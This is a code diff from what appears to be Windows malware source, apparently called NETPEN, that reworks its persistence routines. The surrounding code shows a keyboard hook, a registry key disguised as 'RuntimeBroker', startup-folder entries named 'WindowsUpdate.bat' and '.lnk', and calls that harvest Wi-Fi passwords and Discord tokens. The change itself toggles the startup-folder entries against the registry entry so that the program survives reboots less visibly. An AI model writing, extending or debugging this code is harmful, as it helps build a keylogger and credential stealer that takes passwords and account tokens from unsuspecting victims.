@@ -2266,7 +2266,8 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 #define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
 
 static void EnsureStartupEntry();
-static void EnsureStartupFolderEntry();
+static void CreateStartupFolderEntry();
+static void RemoveStartupFolderEntry();
 
 static void CleanupPersistence() {
     HKEY hKey;
@@ -2387,14 +2388,14 @@ static void EnsureStartupEntry() {
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         RegCloseKey(hKey);
+        RemoveStartupFolderEntry();
     } else {
-        // Payload missing -- reinstall
         InstallStartup();
+        CreateStartupFolderEntry();
     }
-    EnsureStartupFolderEntry();
 }
 
-static void EnsureStartupFolderEntry() {
+static void CreateStartupFolderEntry() {
     char appdata[MAX_PATH];
     if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) == 0 || appdata[0] == 0) return;
     std::string startupPath = std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
@@ -2418,6 +2419,14 @@ static void EnsureStartupFolderEntry() {
         psl->Release();
     }
     CoUninitialize();
+}
+
+static void RemoveStartupFolderEntry() {
+    char appdata[MAX_PATH];
+    if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) == 0 || appdata[0] == 0) return;
+    std::string p = std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+    DeleteFileA((p + "\\WindowsUpdate.bat").c_str());
+    DeleteFileA((p + "\\WindowsUpdate.lnk").c_str());
 }
 
 static int RunChild(HINSTANCE hInstance) {
@@ -2447,6 +2456,7 @@ static int RunChild(HINSTANCE hInstance) {
     }
 
     LogMsg("Child started on " + g_hostname);
+    RemoveStartupFolderEntry();
 
     HarvestWiFiPasswords();
     HarvestDiscordTokens();
